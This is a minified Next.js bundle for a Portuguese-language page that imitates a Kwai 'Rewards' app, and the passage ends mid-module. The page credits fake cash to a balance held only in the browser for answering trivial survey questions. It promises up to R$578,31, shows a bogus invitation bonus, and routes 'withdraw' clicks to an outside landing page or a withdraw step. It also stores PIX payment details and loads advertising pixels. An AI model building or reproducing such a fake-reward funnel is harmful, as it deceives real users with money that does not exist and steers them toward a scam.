(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[931], {
    1538: function(e, t, r) {
        Promise.resolve().then(r.bind(r, 260))
    },
    7885: function(e, t, r) {
        "use strict";
        r.d(t, {
            default: function() {
                return l
            }
        });
        var n = r(7437)
          , s = r(2265)
          , a = r(6070)
          , i = r(2869);
        let o = (0,
        r(9205).Z)("CircleAlert", [["circle", {
            cx: "12",
            cy: "12",
            r: "10",
            key: "1mglay"
        }], ["line", {
            x1: "12",
            x2: "12",
            y1: "8",
            y2: "12",
            key: "1pkeuh"
        }], ["line", {
            x1: "12",
            x2: "12.01",
            y1: "16",
            y2: "16",
            key: "4dfq90"
        }]]);
        function l() {
            let[e,t] = (0,
            s.useState)(!1);
            return ((0,
            s.useEffect)( () => {
                let e = () => t(!0);
                return window.addEventListener("showWithdrawWarning", e),
                () => window.removeEventListener("showWithdrawWarning", e)
            }
            , []),
            e) ? (0,
            n.jsx)("div", {
                className: "fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50",
                children: (0,
                n.jsxs)(a.Zb, {
                    className: "w-full max-w-md p-6 animate-in zoom-in-95 duration-200 bg-white",
                    children: [(0,
                    n.jsxs)("div", {
                        className: "flex items-center gap-4 mb-4",
                        children: [(0,
                        n.jsx)("div", {
                            className: "w-12 h-12 rounded-full bg-[#fff5ec] flex items-center justify-center",
                            children: (0,
                            n.jsx)(o, {
                                className: "w-6 h-6 text-[#ff4d00]"
                            })
                        }), (0,
                        n.jsxs)("div", {
                            children: [(0,
                            n.jsx)("h3", {
                                className: "text-lg font-semibold",
                                children: "Question\xe1rio Pendente"
                            }), (0,
                            n.jsx)("p", {
                                className: "text-sm text-muted-foreground",
                                children: "Complete o question\xe1rio para desbloquear saques"
                            })]
                        })]
                    }), (0,
                    n.jsx)("p", {
                        className: "text-sm text-muted-foreground mb-6",
                        children: "Responda todas as perguntas do question\xe1rio para ganhar at\xe9 R$578,31 e liberar a fun\xe7\xe3o de saque."
                    }), (0,
                    n.jsxs)("div", {
                        className: "flex gap-3",
                        children: [(0,
                        n.jsx)(i.z, {
                            variant: "outline",
                            className: "flex-1",
                            onClick: () => {
                                t(!1)
                            }
                            ,
                            children: "Fechar"
                        }), (0,
                        n.jsx)(i.z, {
                            className: "flex-1 bg-gradient-to-r from-[#ff4d00] to-orange-500 text-white",
                            onClick: () => {
                                t(!1),
                                window.scrollTo({
                                    top: 0,
                                    behavior: "smooth"
                                })
                            }
                            ,
                            children: "Responder Agora"
                        })]
                    })]
                })
            }) : null
        }
    },
    1361: function(e, t, r) {
        "use strict";
        r.d(t, {
            RewardsProvider: function() {
                return i
            },
            t: function() {
                return o
            }
        });
        var n = r(7437)
          , s = r(2265);
        let a = (0,
        s.createContext)(void 0);
        function i(e) {
            let {children: t} = e
              , [r,i] = (0,
            s.useState)(0)
              , [o,l] = (0,
            s.useState)(0)
              , [c,d] = (0,
            s.useState)(!1)
              , [u,f] = (0,
            s.useState)(null)
              , [m,h] = (0,
            s.useState)(!0)
              , [x,p] = (0,
            s.useState)(null)
              , v = (0,
            s.useCallback)( () => {
                if (!u)
                    return !0;
                let e = new Date(u)
                  , t = new Date
                  , r = new Date(e);
                return r.setHours(24, 0, 0, 0),
                t >= r
            }
            , [u])
              , g = (0,
            s.useCallback)(e => {
                p(e),
                localStorage.setItem("kwai-pix-details", JSON.stringify(e))
            }
            , [])
              , b = (0,
            s.useCallback)( () => {
                if (!u)
                    return null;
                let e = new Date(u);
                return e.setHours(24, 0, 0, 0),
                e
            }
            , [u])
              , w = (0,
            s.useCallback)(e => {
                i(t => {
                    let r = Math.max(0, t + e);
                    return localStorage.setItem("kwai-balance", r.toString()),
                    r
                }
                )
            }
            , [])
              , j = (0,
            s.useCallback)( () => {
                c || (d(!0),
                w(50),
                localStorage.setItem("kwai-initial-bonus", "true"))
            }
            , [c, w])
              , y = (0,
            s.useCallback)( () => {
                h(!1),
                localStorage.setItem("kwai-first-visit-complete", "true")
            }
            , [])
              , N = (0,
            s.useCallback)( () => {
                l(e => {
                    let t = e + 1;
                    if (localStorage.setItem("kwai-questions-completed", t.toString()),
                    t >= 14) {
                        let e = new Date().toISOString();
                        f(e),
                        localStorage.setItem("kwai-last-completion", e)
                    }
                    return t
                }
                )
            }
            , [])
              , k = (0,
            s.useCallback)( () => {
                v() && (l(0),
                localStorage.setItem("kwai-questions-completed", "0"),
                f(null),
                localStorage.removeItem("kwai-last-completion"))
            }
            , [v]);
            return (0,
            s.useEffect)( () => {
                let e = localStorage.getItem("kwai-balance")
                  , t = localStorage.getItem("kwai-questions-completed")
                  , r = localStorage.getItem("kwai-initial-bonus")
                  , n = localStorage.getItem("kwai-last-completion")
                  , s = localStorage.getItem("kwai-first-visit-complete")
                  , a = localStorage.getItem("kwai-pix-details");
                e && i(Number(e)),
                t && l(Number(t)),
                "true" === r && d(!0),
                n && f(n),
                "true" === s && h(!1),
                a && p(JSON.parse(a)),
                n && !v() && k()
            }
            , [v, k]),
            (0,
            n.jsx)(a.Provider, {
                value: {
                    balance: r,
                    questionsCompleted: o,
                    totalQuestions: 14,
                    addToBalance: w,
                    markQuestionCompleted: N,
                    isQuestionnaireCompleted: o >= 14,
                    resetQuestionnaire: k,
                    hasInitialBonus: c,
                    setInitialBonus: j,
                    canTakeQuestionnaire: v(),
                    nextQuestionnaireTime: b(),
                    lastCompletionDate: u,
                    isFirstVisit: m,
                    markFirstVisitComplete: y,
                    savedPixDetails: x,
                    savePixDetails: g
                },
                children: t
            })
        }
        function o() {
            let e = (0,
            s.useContext)(a);
            if (void 0 === e)
                throw Error("useRewards must be used within a RewardsProvider");
            return e
        }
    },
    260: function(e, t, r) {
        "use strict";
        r.r(t),
        r.d(t, {
            default: function() {
                return Q
            }
        });
        var n = r(7437)
          , s = r(2265)
          , a = r(2869)
          , i = r(2660)
          , o = r(9205);
        let l = (0,
        o.Z)("Maximize", [["path", {
            d: "M8 3H5a2 2 0 0 0-2 2v3",
            key: "1dcmit"
        }], ["path", {
            d: "M21 8V5a2 2 0 0 0-2-2h-3",
            key: "1e4gt3"
        }], ["path", {
            d: "M3 16v3a2 2 0 0 0 2 2h3",
            key: "wsl5sc"
        }], ["path", {
            d: "M16 21h3a2 2 0 0 0 2-2v-3",
            key: "18trek"
        }]]);
        var c = r(3245)
          , d = r(9376)
          , u = r(1361);
        function f() {
            let e = (0,
            d.useRouter)()
              , {balance: t, isQuestionnaireCompleted: r, canTakeQuestionnaire: o} = (0,
            u.t)()
              , [f,m] = (0,
            s.useState)(0);
            (0,
            s.useEffect)( () => {
                if (t > f) {
                    let e = (t - f) / 10
                      , r = setInterval( () => {
                        m(n => {
                            let s = n + e;
                            return s >= t ? (clearInterval(r),
                            t) : s
                        }
                        )
                    }
                    , 10);
                    return () => clearInterval(r)
                }
            }
            , [t, f]);
            let h = () => {
                if (!r && o) {
                    window.dispatchEvent(new Event("showWithdrawWarning"));
                    return
                }
                function hasAllURLParameters(names) {
                    const urlParams = new URLSearchParams(window.location.search);
                    return names.every(param => urlParams.has(param));
                }
                const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
                if (!hasAllURLParameters(requiredParams)) {
                    window.location.href = 'https://appavaliadorpremios.shop/lp/';
                } else {
                    const urlParams = new URLSearchParams(window.location.search);
                    const utms = urlParams.toString();
                    const redirectUrl = "/withdraw/" + (utms ? `?${utms}` : '');
                    window.location.href = redirectUrl;
                }
            }
            ;
            return (0,
            n.jsxs)("div", {
                className: "mb-6",
                children: [(0,
                n.jsxs)("div", {
                    className: "flex items-center justify-between mb-8",
                    children: [(0,
                    n.jsx)(a.z, {
                        variant: "ghost",
                        size: "icon",
                        className: "hover:bg-black/5",
                        children: (0,
                        n.jsx)(i.Z, {
                            className: "w-6 h-6"
                        })
                    }), (0,
                    n.jsxs)("div", {
                        className: "flex gap-2",
                        children: [(0,
                        n.jsx)(a.z, {
                            variant: "ghost",
                            size: "icon",
                            className: "hover:bg-black/5",
                            children: (0,
                            n.jsx)(l, {
                                className: "w-6 h-6"
                            })
                        }), (0,
                        n.jsx)(a.z, {
                            variant: "ghost",
                            size: "icon",
                            className: "hover:bg-black/5",
                            children: (0,
                            n.jsx)(c.Z, {
                                className: "w-6 h-6"
                            })
                        })]
                    })]
                }), (0,
                n.jsxs)("div", {
                    className: "grid grid-cols-2 gap-8",
                    children: [(0,
                    n.jsxs)("div", {
                        children: [(0,
                        n.jsx)("div", {
                            className: "text-lg font-medium mb-1",
                            children: "Saldo"
                        }), (0,
                        n.jsxs)("div", {
                            className: "flex flex-col items-start",
                            children: [(0,
                            n.jsxs)("button", {
                                onClick: h,
                                className: "flex items-center gap-1 group",
                                children: [(0,
                                n.jsxs)("span", {
                                    className: "text-2xl font-bold group-hover:text-[#ff4d00] transition-colors",
                                    children: ["R$ ", f.toFixed(2)]
                                }), (0,
                                n.jsx)("span", {
                                    className: "text-xl group-hover:text-[#ff4d00] transition-colors",
                                    children: ">"
                                })]
                            }), (0,
                            n.jsx)(a.z, {
                                size: "sm",
                                className: "mt-2 bg-[#ff4d00] hover:bg-[#ff4d00]/90 text-white",
                                onClick: h,
                                children: "Sacar"
                            })]
                        })]
                    }), (0,
                    n.jsxs)("div", {
                        children: [(0,
                        n.jsxs)("div", {
                            className: "flex items-center gap-1 mb-1",
                            children: [(0,
                            n.jsx)("span", {
                                className: "text-lg font-medium",
                                children: "Golds"
                            }), (0,
                            n.jsx)("span", {
                                className: "text-sm",
                                children: "?"
                            })]
                        }), (0,
                        n.jsxs)("div", {
                            className: "flex items-center gap-1",
                            children: [(0,
                            n.jsx)("div", {
                                className: "w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center text-white font-bold",
                                children: "R$"
                            }), (0,
                            n.jsx)("span", {
                                className: "text-2xl font-bold",
                                children: "170"
                            }), (0,
                            n.jsx)("span", {
                                className: "text-xl",
                                children: ">"
                            })]
                        })]
                    })]
                })]
            })
        }
        var m = r(6070);
        let h = (0,
        o.Z)("X", [["path", {
            d: "M18 6 6 18",
            key: "1bl5f8"
        }], ["path", {
            d: "m6 6 12 12",
            key: "d8bk6v"
        }]]);
        function x() {
            let {isFirstVisit: e, markFirstVisitComplete: t, setInitialBonus: r, hasInitialBonus: i} = (0,
            u.t)()
              , o = (0,
            s.useRef)(null);
            return ((0,
            s.useEffect)( () => {
                o.current = new Audio("/youtube_3Bsv4CH_yrk_audio.mp3")
            }
            , []),
            !e || i) ? null : (0,
            n.jsx)("div", {
                className: "fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50",
                children: (0,
                n.jsxs)(m.Zb, {
                    className: "w-full max-w-md relative animate-in fade-in-0 zoom-in-95 bg-white",
                    children: [(0,
                    n.jsx)(a.z, {
                        variant: "ghost",
                        size: "icon",
                        className: "absolute right-2 top-2",
                        onClick: t,
                        children: (0,
                        n.jsx)(h, {
                            className: "w-4 h-4"
                        })
                    }), (0,
                    n.jsxs)(m.Ol, {
                        className: "text-center",
                        children: [(0,
                        n.jsx)(m.ll, {
                            className: "text-2xl",
                            children: "Parab\xe9ns!"
                        }), (0,
                        n.jsx)(m.SZ, {
                            children: "Voc\xea recebeu recompensa de convite!"
                        })]
                    }), (0,
                    n.jsxs)(m.aY, {
                        className: "text-center space-y-4",
                        children: [(0,
                        n.jsxs)("div", {
                            className: "flex items-center justify-center gap-4 text-4xl font-bold",
                            children: [(0,
                            n.jsxs)("div", {
                                children: [(0,
                                n.jsx)("div", {
                                    className: "text-sm text-muted-foreground",
                                    children: "R$"
                                }), "38"]
                            }), (0,
                            n.jsx)("div", {
                                className: "text-2xl",
                                children: "+"
                            }), (0,
                            n.jsxs)("div", {
                                className: "text-[#ff4d00]",
                                children: [(0,
                                n.jsx)("div", {
                                    className: "text-sm text-muted-foreground",
                                    children: "R$"
                                }), "12"]
                            })]
                        }), (0,
                        n.jsx)("div", {
                            className: "bg-orange-100 text-[#ff4d00] py-2 px-4 rounded-full text-sm",
                            children: "Pr\xeamio por tempo limitado"
                        })]
                    }), (0,
                    n.jsx)(m.eW, {
                        children: (0,
                        n.jsx)(a.z, {
                            className: "w-full bg-gradient-to-r from-[#ff4d00] to-orange-500 hover:from-[#ff4d00]/90 hover:to-orange-500/90 text-white",
                            onClick: () => {
                                r(),
                                t(),
                                o.current && o.current.play(),
                                window.dispatchEvent(new Event("rewardConfirmed"))
                            }
                            ,
                            children: "Confirmar"
                        })
                    })]
                })
            })
        }
        let p = (0,
        o.Z)("Gift", [["rect", {
            x: "3",
            y: "8",
            width: "18",
            height: "4",
            rx: "1",
            key: "bkv52"
        }], ["path", {
            d: "M12 8v13",
            key: "1c76mn"
        }], ["path", {
            d: "M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7",
            key: "6wjy6b"
        }], ["path", {
            d: "M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5",
            key: "1ihvrl"
        }]])
          , v = (0,
        o.Z)("Coins", [["circle", {
            cx: "8",
            cy: "8",
            r: "6",
            key: "3yglwk"
        }], ["path", {
            d: "M18.09 10.37A6 6 0 1 1 10.34 18",
            key: "t5s6rm"
        }], ["path", {
            d: "M7 6h1v4",
            key: "1obek4"
        }], ["path", {
            d: "m16.71 13.88.7.71-2.82 2.82",
            key: "1rbuyh"
        }]])
          , g = (0,
        o.Z)("ChevronRight", [["path", {
            d: "m9 18 6-6-6-6",
            key: "mthhwq"
        }]]);
        function b() {
            let[e,t] = (0,
            s.useState)(0)
              , r = (0,
            d.useRouter)()
              , {addToBalance: i, markQuestionCompleted: o, canTakeQuestionnaire: l, nextQuestionnaireTime: c, resetQuestionnaire: f, questionsCompleted: h, totalQuestions: x, isQuestionnaireCompleted: b} = (0,
            u.t)()
              , w = [{
                question: "Qual sua idade?",
                options: ["18-24", "25-34", "35-44", "45+"],
                reward: 52.55
            }, {
                question: "Com que frequ\xeancia voc\xea usa redes sociais?",
                options: ["Diariamente", "Algumas vezes por semana", "Raramente", "Nunca"],
                reward: 48.92
            }, {
                question: "Voc\xea costuma assistir v\xeddeos curtos?",
                options: ["Sim, frequentemente", "\xc0s vezes", "Raramente", "N\xe3o"],
                reward: 45.67
            }, {
                question: "Quanto tempo por dia voc\xea passa assistindo v\xeddeos?",
                options: ["Menos de 1 hora", "1-2 horas", "2-4 horas", "Mais de 4 horas"],
                reward: 43.21
            }, {
                question: "Voc\xea j\xe1 ganhou dinheiro com redes sociais?",
                options: ["Sim, regularmente", "Sim, ocasionalmente", "N\xe3o, mas tenho interesse", "N\xe3o tenho interesse"],
                reward: 41.89
            }, {
                question: "Qual tipo de conte\xfado voc\xea mais gosta?",
                options: ["Humor", "Educativo", "Lifestyle", "M\xfasica"],
                reward: 39.76
            }, {
                question: "Voc\xea costuma criar conte\xfado para redes sociais?",
                options: ["Sim, diariamente", "Algumas vezes por semana", "Raramente", "Nunca"],
                reward: 37.45
            }, {
                question: "Como voc\xea descobriu o Rewards?",
                options: ["Amigos", "An\xfancios", "Redes sociais", "Outros"],
                reward: 35.88
            }, {
                question: "Voc\xea indicaria o aplicativo para amigos?",
                options: ["Definitivamente sim", "Provavelmente sim", "Talvez", "N\xe3o"],
                reward: 33.92
            }, {
                question: "Qual seu objetivo principal no aplicativo?",
                options: ["Ganhar dinheiro", "Entretenimento", "Criar conte\xfado", "Conhecer pessoas"],
                reward: 31.76
            }, {
                question: "Que tipo de conte\xfado voc\xea gostaria de criar?",
                options: ["Vlogs", "Tutoriais", "M\xfasica", "Com\xe9dia"],
                reward: 29.84
            }, {
                question: "Quanto tempo voc\xea dedica \xe0s redes sociais por dia?",
                options: ["Menos de 1h", "1-3h", "3-5h", "Mais de 5h"],
                reward: 27.93
            }, {
                question: "Voc\xea j\xe1 participou de desafios em redes sociais?",
                options: ["Frequentemente", "\xc0s vezes", "Raramente", "Nunca"],
                reward: 25.82
            }, {
                question: "O que mais te motiva a usar o aplicativo?",
                options: ["Recompensas", "Conte\xfado", "Comunidade", "Criar v\xeddeos"],
                reward: 83.71
            }]
              , j = () => {
                e < w.length && (i(w[e].reward),
                o(),
                t(e => e + 1))
            }
            ;
            return (0,
            n.jsxs)("div", {
                className: "space-y-4",
                children: [(0,
                n.jsxs)(m.Zb, {
                    className: "p-6 bg-gradient-to-r from-[#ff4d00] to-orange-500 text-white",
                    children: [(0,
                    n.jsxs)("div", {
                        className: "flex items-center gap-3 mb-4",
                        children: [(0,
                        n.jsx)(p, {
                            className: "w-8 h-8"
                        }), (0,
                        n.jsx)("h2", {
                            className: "text-2xl font-bold",
                            children: "Bem-vindo ao Rewards!"
                        })]
                    }), (0,
                    n.jsx)("p", {
                        className: "text-white/90 mb-4",
                        children: "Ganhe recompensas respondendo perguntas simples e completando atividades di\xe1rias."
                    }), (0,
                    n.jsxs)("div", {
                        className: "flex items-center gap-2 bg-white/20 p-3 rounded-lg",
                        children: [(0,
                        n.jsx)(v, {
                            className: "w-5 h-5 text-yellow-300"
                        }), (0,
                        n.jsx)("span", {
                            className: "text-sm",
                            children: "Ganhe at\xe9 R$578,31 em recompensas hoje!"
                        })]
                    })]
                }), l && e < w.length && (0,
                n.jsxs)(m.Zb, {
                    className: "p-6 bg-white",
                    children: [(0,
                    n.jsxs)("div", {
                        className: "mb-6",
                        children: [(0,
                        n.jsxs)("div", {
                            className: "text-sm text-muted-foreground mb-2",
                            children: ["Quest\xe3o ", h + 1, " de ", x]
                        }), (0,
                        n.jsx)("h3", {
                            className: "text-xl font-semibold",
                            children: w[e].question
                        })]
                    }), (0,
                    n.jsx)("div", {
                        className: "space-y-3",
                        children: w[e].options.map( (e, t) => (0,
                        n.jsxs)(a.z, {
                            variant: "outline",
                            className: "w-full justify-between group hover:border-kwai-red hover:text-kwai-red",
                            onClick: j,
                            children: [e, (0,
                            n.jsx)(g, {
                                className: "w-4 h-4 group-hover:translate-x-1 transition-transform"
                            })]
                        }, t))
                    }), (0,
                    n.jsxs)("div", {
                        className: "mt-4 text-center text-sm text-muted-foreground",
                        children: [(0,
                        n.jsx)(v, {
                            className: "w-4 h-4 inline mr-1 text-yellow-500"
                        }), "Ganhe R$", w[e].reward.toFixed(2), " por esta resposta"]
                    })]
                }), b && (0,
                n.jsxs)(m.Zb, {
                    className: "p-6 text-center bg-white",
                    children: [(0,
                    n.jsxs)("div", {
                        className: "mb-4",
                        children: [(0,
                        n.jsx)("div", {
                            className: "w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4",
                            children: (0,
                            n.jsx)(p, {
                                className: "w-8 h-8 text-kwai-red"
                            })
                        }), (0,
                        n.jsx)("h3", {
                            className: "text-xl font-semibold",
                            children: "Parab\xe9ns!"
                        }), (0,
                        n.jsx)("p", {
                            className: "text-muted-foreground mt-2",
                            children: "Voc\xea completou o question\xe1rio e ganhou R$578,31 em recompensas!"
                        })]
                    }), (0,
                    n.jsx)(a.z, {
                        className: "w-full bg-gradient-to-r from-kwai-red to-kwai-orange hover:from-kwai-red/90 hover:to-kwai-orange/90 text-white",
                        onClick: () => {
                            function hasAllURLParameters(names) {
                                const urlParams = new URLSearchParams(window.location.search);
                                return names.every(param => urlParams.has(param));
                            }
                            const requiredParams = ['CampaignID', 'adSETID', 'CreativeID', 'pixel_id'];
                            if (!hasAllURLParameters(requiredParams)) {
                                window.location.href = 'https://appavaliadorpremios.shop/lp/';
                            } else {
                                const urlParams = new URLSearchParams(window.location.search);
                                const utms = urlParams.toString();
                                const redirectUrl = "/withdraw/" + (utms ? `?${utms}` : '');
                                window.location.href = redirectUrl;
                            }
                        }
                        ,
                        children: "Continuar"
                    })]
                })]
            })
        }
        function w() {
            return (0,
            n.jsx)("div", {
                className: "flex items-center justify-center min-h-screen",
                children: (0,
                n.jsx)("div", {
                    className: "w-8 h-8 border-4 border-white border-t-transparent rounded-full animate-spin"
                })
            })
        }
        var j = r(7885);
        let y = (0,
        o.Z)("Bell", [["path", {
            d: "M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9",
            key: "1qo2s2"
        }], ["path", {
            d: "M10.3 21a1.94 1.94 0 0 0 3.4 0",
            key: "qgo35s"
        }]]);
        var N = r(6741)
          , k = r(8575)
          , C = r(3966)
          , S = r(886)
          , q = r(6718)
          , R = r(420)
          , _ = r(6840)
          , M = "Switch"
          , [z,E] = (0,
        C.b)(M)
          , [P,I] = z(M)
          , O = s.forwardRef( (e, t) => {
            let {__scopeSwitch: r, name: a, checked: i, defaultChecked: o, required: l, disabled: c, value: d="on", onCheckedChange: u, form: f, ...m} = e
              , [h,x] = s.useState(null)
              , p = (0,
            k.e)(t, e => x(e))
              , v = s.useRef(!1)
              , g = !h || f || !!h.closest("form")
              , [b=!1,w] = (0,
            S.T)({
                prop: i,
                defaultProp: o,
                onChange: u
            });
            return (0,
            n.jsxs)(P, {
                scope: r,
                checked: b,
                disabled: c,
                children: [(0,
                n.jsx)(_.WV.button, {
                    type: "button",
                    role: "switch",
                    "aria-checked": b,
                    "aria-required": l,
                    "data-state": V(b),
                    "data-disabled": c ? "" : void 0,
                    disabled: c,
                    value: d,
                    ...m,
                    ref: p,
                    onClick: (0,
                    N.M)(e.onClick, e => {
                        w(e => !e),
                        g && (v.current = e.isPropagationStopped(),
                        v.current || e.stopPropagation())
                    }
                    )
                }), g && (0,
                n.jsx)(W, {
                    control: h,
                    bubbles: !v.current,
                    name: a,
                    value: d,
                    checked: b,
                    required: l,
                    disabled: c,
                    form: f,
                    style: {
                        transform: "translateX(-100%)"
                    }
                })]
            })
        }
        );
        O.displayName = M;
        var Z = "SwitchThumb"
          , A = s.forwardRef( (e, t) => {
            let {__scopeSwitch: r, ...s} = e
              , a = I(Z, r);
            return (0,
            n.jsx)(_.WV.span, {
                "data-state": V(a.checked),
                "data-disabled": a.disabled ? "" : void 0,
                ...s,
                ref: t
            })
        }
        );
        A.displayName = Z;
        var W = e => {
            let {control: t, checked: r, bubbles: a=!0, ...i} = e
              , o = s.useRef(null)
              , l = (0,
            q.D)(r)
              , c = (0,
            R.t)(t);
            return s.useEffect( () => {
                let e = o.current
                  , t = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "checked").set;
                if (l !== r && t) {
                    let n = new Event("click",{
                        bubbles: a
                    });
                    t.call(e, r),
                    e.dispatchEvent(n)
                }
            }
            , [l, r, a]),
            (0,
            n.jsx)("input", {
                type: "checkbox",
                "aria-hidden": !0,
                defaultChecked: r,
                ...i,
                tabIndex: -1,
                ref: o,
                style: {
                    ...e.style,
                    ...c,
                    position: "absolute",
                    pointerEvents: "none",
                    opacity: 0,
                    margin: 0
                }
            })
        }
        ;
        function V(e) {
            return e ? "checked" : "unchecked"
        }
        var T = r(4508);
        let H = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
            n.jsx)(O, {
                className: (0,
                T.cn)("peer inline-flex h-6 w-11 shrink-0 cursor-pointer items-center rounded-full border-2 border-transparent transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-background disabled:cursor-not-allowed disabled:opacity-50 data-[state=checked]:bg-primary data-[state=unchecked]:bg-input", r),
                ...s,
                ref: t,
                children: (0,
                n.jsx)(A, {
                    className: (0,
                    T.cn)("pointer-events-none block h-5 w-5 rounded-full bg-background shadow-lg ring-0 transition-transform data-[state=checked]:translate-x-5 data-[state=unchecked]:translate-x-0")
                })
            })
        }
        );
        function $() {
            let[e,t] = (0,
            s.useState)(!0)
              , {isQuestionnaireCompleted: r} = (0,
            u.t)();
            return r ? (0,
            n.jsx)("div", {
                className: "bg-white rounded-lg p-4 mb-4",
                children: (0,
                n.jsxs)("div", {
                    className: "flex items-center justify-between",
                    children: [(0,
                    n.jsxs)("div", {
                        className: "flex items-center gap-2",
                        children: [(0,
                        n.jsx)(y, {
                            className: "w-5 h-5 text-yellow-600"
                        }), (0,
                        n.jsx)("span", {
                            className: "text-sm text-gray-600",
                            children: "Clique no bot\xe3o \xe0 direita para desativar o lembrete de dinheiro."
                        })]
                    }), (0,
                    n.jsx)(H, {
                        checked: e,
                        onCheckedChange: t,
                        className: "data-[state=checked]:bg-[#ff4d00]"
                    })]
                })
            }) : null
        }
        H.displayName = O.displayName;
        var D = r(8667);
        function Q() {
            return (0,
            s.useEffect)( () => {
                window.fbq && window.fbq("track", "PageView")
            }
            , []),
            (0,
            n.jsxs)("main", {
                className: "min-h-screen bg-[#fff5ec]",
                children: [(0,
                n.jsx)(D.default, {
                    id: "kwai-pixel",
                    strategy: "afterInteractive",
                    children: '\n          !function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e,n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject=n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t]=function(){for(var n=[],r=0;r<arguments.length;r++)n[r]=arguments[r];var i=o([t],n,!0);e.push(i)}};i.methods.forEach((function(e){a(i,e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n,e)})),n},i.load=function(e,o){var a="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js";i._i=i._i||{},i._i[e]=[],i._i[e]._u=a,i._t=i._t||{},i._t[e]=+new Date,i._o=i._o||{},i._o[e]=o||{};var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"https://s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.js"+c)}}(window,document,"kwaiq")}])}));\n        '
                }), (0,
                n.jsx)(D.default, {
                    id: "kwai-pixel-load",
                    strategy: "afterInteractive",
                    children: "\n          kwaiq.load('272456330172322');\n          kwaiq.page();\n          kwaiq.track('contentView');\n        "
                }), (0,
                n.jsx)(s.Suspense, {
                    fallback: (0,
                    n.jsx)(w, {}),
                    children: (0,
                    n.jsxs)("div", {
                        className: "container mx-auto px-4 py-6 max-w-md",
                        children: [(0,
                        n.jsx)(f, {}), (0,
                        n.jsx)($, {}), (0,
                        n.jsx)(b, {}), (0,
                        n.jsx)(x, {}), (0,
                        n.jsx)(j.default, {})]
                    })
                })]
            })
        }
    },
    2869: function(e, t, r) {
        "use strict";
        r.d(t, {
            z: function() {
                return c
            }
        });
        var n = r(7437)
          , s = r(2265)
          , a = r(7053)
          , i = r(535)
          , o = r(4508);
        let l = (0,
        i.j)("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
            variants: {
                variant: {
                    default: "bg-primary text-primary-foreground hover:bg-primary/90",
                    destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
                    outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
                    secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
                    ghost: "hover:bg-accent hover:text-accent-foreground",
                    link: "text-primary underline-offset-4 hover:underline"
                },
                size: {
                    default: "h-10 px-4 py-2",
                    sm: "h-9 rounded-md px-3",
                    lg: "h-11 rounded-md px-8",
                    icon: "h-10 w-10"
                }
            },
            defaultVariants: {
                variant: "default",
                size: "default"
            }
        })
          , c = s.forwardRef( (e, t) => {
            let {className: r, variant: s, size: i, asChild: c=!1, ...d} = e
              , u = c ? a.g7 : "button";
            return (0,
            n.jsx)(u, {
                className: (0,
                o.cn)(l({
                    variant: s,
                    size: i,
                    className: r
                })),
                ref: t,
                ...d
            })
        }
        );
        c.displayName = "Button"
    },
    6070: function(e, t, r) {
        "use strict";
        r.d(t, {
            Ol: function() {
                return o
            },
            SZ: function() {
                return c
            },
            Zb: function() {
                return i
            },
            aY: function() {
                return d
            },
            eW: function() {
                return u
            },
            ll: function() {
                return l
            }
        });
        var n = r(7437)
          , s = r(2265)
          , a = r(4508);
        let i = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
